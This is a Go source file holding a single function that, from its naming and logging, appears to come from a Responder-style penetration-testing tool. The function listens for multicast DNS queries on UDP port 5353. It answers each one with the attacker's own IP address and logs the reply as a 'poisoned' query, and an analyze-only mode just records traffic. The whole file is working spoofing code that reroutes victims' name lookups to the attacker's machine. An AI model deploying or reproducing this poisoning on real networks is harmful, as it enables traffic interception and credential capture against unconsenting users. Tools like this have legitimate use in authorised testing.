package main

import (
	"fmt"
	"net"
)

const mdnsMulticast = "224.0.0.251"
const mdnsPort = 5353

func poisonMDNS(ifaceIP net.IP) {
	conn, err := net.ListenPacket("udp4", fmt.Sprintf("0.0.0.0:%d", mdnsPort))
	if err != nil {
		logError("MDNS listen :%d — %v (need root?)", mdnsPort, err)
		return
	}
	defer conn.Close()

	logInfo("MDNS listening on %s (UDP %d)", ifaceIP, mdnsPort)

	buf := make([]byte, 512)
	for {
		n, src, err := conn.ReadFrom(buf)
		if err != nil {
			continue
		}
		pkt := buf[:n]
		name := parseLLMNRQuery(pkt) // same DNS wire format as LLMNR
		if name == "" {
			continue
		}
		// Skip MDNS meta-queries (Bonjour service discovery, etc.)
		if name == "_DOSVC" || name == "wpad" || name == "WPAD" {
			continue
		}
		logVerbose("MDNS  query: %s from %s", name, src)
		if analyzeMode {
			logInfo("[MDNS] [Analyze] query for '%s' from %s", name, src)
			continue
		}
		resp := buildLLMNRResponse(pkt, ifaceIP)
		if resp != nil {
			// Unicast reply to sender (standard for mDNS when TC bit not set)
			conn.WriteTo(resp, src)
			logInfo("[MDNS] Poisoned query for '%s' — responding with %s", name, ifaceIP)
		}
	}
}
